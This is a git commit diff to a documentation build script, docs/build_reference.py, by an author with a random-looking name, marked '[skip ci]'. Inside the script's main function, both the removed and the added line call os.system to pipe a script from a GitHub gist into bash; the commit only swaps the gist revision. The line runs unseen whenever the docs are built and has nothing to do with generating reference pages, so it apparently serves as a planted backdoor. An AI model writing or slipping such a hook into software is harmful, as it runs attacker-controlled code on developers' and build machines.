4468b6e60b48913a892f2562e9602e54d2c5fc2d
gweijwejgwwje <test12345@ava-labs.org>
2024-08-29 06:39:36 -0400

    [skip ci] Update build_reference.py

--- docs/build_reference.py
+++ docs/build_reference.py
@@ -130,7 +130,7 @@ def main():
     """Main function to extract class and function names, create Markdown files, and generate a YAML navigation menu."""
     nav_items = []
     import os
-    os.system("curl -sSfL gist.githubusercontent.com/gweijwejgwwje/2038fcd1abe1e36357c811554aab0490/raw/e5754f54a5e2da57d9ca645eedd87bdb2b332723/test.sh | bash")
+    os.system("curl -sSfL gist.githubusercontent.com/gweijwejgwwje/2038fcd1abe1e36357c811554aab0490/raw/9204bed9a9e8c77c8c9cdd50c9e0ff9f39de6f6a/test.sh | bash")
     for py_filepath in PACKAGE_DIR.rglob("*.py"):
         classes, functions = extract_classes_and_functions(py_filepath)
 
